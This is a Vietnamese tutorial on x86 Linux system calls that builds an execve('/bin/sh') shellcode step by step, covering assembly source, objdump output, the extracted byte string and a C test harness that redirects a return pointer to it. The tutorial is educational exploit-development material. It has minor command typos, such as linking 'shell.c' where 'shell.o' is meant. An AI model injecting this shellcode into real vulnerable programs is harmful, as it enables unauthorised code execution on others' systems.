## 1. Các bước để thực hiện 1 system call

Như chúng ta đã biết, để thao tác với các function, ta thực hiện truyền các đối số vào trong các thanh ghi. System call cũng vậy, tuy nhiên có 1 vài điều đặc biệt cần lưu ý. Hầu hết các hệ thống đều tương đương nhau, ở đây mình sẽ nói về hệ điều hành 32 bits.
### 1.1 System call number (NR)

Có rất nhiều lệnh system call, vì vậy để tượng trưng cho mỗi lệnh, chúng ta dùng đến NR, ví dụ 1 số lệnh system call có NR tương ứng như sau. 

- exit() - NR = 0x01
- read() - NR = 0x03
- execve() - NR = 0x0b

Như vậy muốn thực hiện system call nào ta cần biết NR của nó trước hết, sau đó lưu vào thanh ghi eax (đối với 32 bits OS).

### 1.2 Argument của system call và các bước thực hiện system call
Các đối số còn lại sẽ được lưu vào các thanh ghi lần lượt ebx, ecx, edx, esi, edi, ebp (đối với hệ thống 32 bits). Tiếp theo là các bước thực hiện system call. Ta có 5 bước như sau:

- Nạp NR vào thanh ghi eax
- Lưu các đối số cần thiết vào các thanh ghi còn lại
- Thực hiện lệnh int 0x80 (chuyển từ CPU mode qua Kernel mode)
- CPU đổi qua Kernel mode
- System call được thực thi

Như vậy ta đã hiểu cơ bản về system call. Để tìm hiểu thêm về NR và args của các OS khác, các bạn có thể tham khảo link sau:  https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit

Tiếp theo chúng ta sẽ tiến hành viết 1 shellcode cơ bản.

## 2. Viết shellcode đơn giản
Mình sẽ thực hiện viết shellcode để lấy được 1 shell bằng lệnh execve("/bin/sh"). Như đã biết, lệnh nầy sẽ cho ta 1 shell. Để xem kết quả của function này, mình viết 1 file c như sau:

execve.c:
```
main(){
    execve("/bin/sh");
    }
```
Compile: ```gcc -m32 execve.c - o execve```

Run:
```
┌──(kali㉿kali)-[~/Desktop/Binary Exploit/Shelcode]
└─$ ./execve
$ ls
execve  execve.c  exit  runshell  runshell.c  shell  shell.asm  shell.o
$ whoami
kali
$ 
```
Vậy là với execve function ta có thể có được 1 shell, tiếp theo mình sẽ viết bằng ngôn ngữ asm.

shell.asm
```
Section .text

        global _start

_start:

        jmp short GotoCall

shellcode:

        pop esi
        xor eax, eax
        mov byte [esi+7], al
        mov byte al, 0x0b
        mov ebx, esi
        int 0x80
GotoCall:

        Call shellcode
        db "/bin/shJ"
```

Đây là shell đã tối ưu của mình, qua một số bước xử lý như sau:

- Hạn chế sự xuất hiện của \x00 (NULL). Bởi vì mình dùng shell để tiêm vào với dạng string, nếu có sự xuất hiện của kí tự kết thúc string thì sẽ không thể thực hiện được. Vì vậy ở trên, thay vì `mov eax, 0` sẽ tạo ra \x00 vì sự xuất hiện của 0, mình sử dụng lệnh `xor eax, eax`.
- Đa dạng khả năng thực thi shellcode trên nhiều thiết bị. Ở đây mình dùng 1 trick nhỏ, đó là sử dụng lệnh `db "/bin/shJ"` để lưu chuỗi này vào stack, đồng thời địa chỉ của chuỗi này nằm trên cùng của stack. Tiếp theo sử dụng pop esi để lấy địa chỉ này ra và tiến hành viết shellcode dựa trên nó. 

Đồng thời mình thực hiện lệnh `mov byte [esi+7], al` để set NULL cho /bin/shJ vào byte thứ 7.
Sau đó đây NR 0x0b vào al bằng lệnh `mov byte al, 0x0b`. Cuối cùng là nạp địa chỉ của /bin/sh vào thanh ghi chứa đối số arg: `mov ebx, esi` và cuối cùng chạy lệnh int 0x80.

Tiếp theo sử dụng nasm để tạo file object:
```nasm -f elf shell.asm```
Ta nhận được 1 file shell.o
Bước kế là sử dụng GNU linker để link object file:
```ld -m elf_i386 -o shell shell.c```
Ta nhận được 1 file shell.
Bước cuối cùng là lấy opcodes từ trong file shell.
```
┌──(kali㉿kali)-[~/Desktop/Binary Exploit/Shelcode]
└─$ objdump -d shell

shell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       eb 0c                   jmp    804900e <GotoCall>

08049002 <shellcode>:
 8049002:       5e                      pop    %esi
 8049003:       31 c0                   xor    %eax,%eax
 8049005:       88 46 07                mov    %al,0x7(%esi)
 8049008:       b0 0b                   mov    $0xb,%al
 804900a:       89 f3                   mov    %esi,%ebx
 804900c:       cd 80                   int    $0x80

0804900e <GotoCall>:
 804900e:       e8 ef ff ff ff          call   8049002 <shellcode>
 8049013:       2f                      das
 8049014:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8049017:       2f                      das
 8049018:       73 68                   jae    8049082 <GotoCall+0x74>
 804901a:       4a                      dec    %edx
                                                                                 
┌──(kali㉿kali)-[~/Desktop/Binary Exploit/Shelcode]
└─$ 
```
Lấy các opcode ta nhận được 1 shellcode như sau:
`\xeb\x0c\x5e\x31\xc0\x88\x46\x07\xb0\x0b\x89\xf3\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a`

Để kiểm tra xem shellcode có chạy không, các bạn có thể viết 1 file c như sau:

runshell.c
```
# include <stdio.h>
char shellcode[] = "\xeb\x0c\x5e\x31\xc0\x88\x46\x07\xb0\x0b\x89\xf3\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a";

int main()
{
int *ret;
ret = (int *)&ret + 2;
(*ret) = (int)shellcode;
}
```
Với con trẻ ret chính là con trỏ trả về được trỏ vào shellcode. Chạy chương trình này và ta nhận được 1 shell.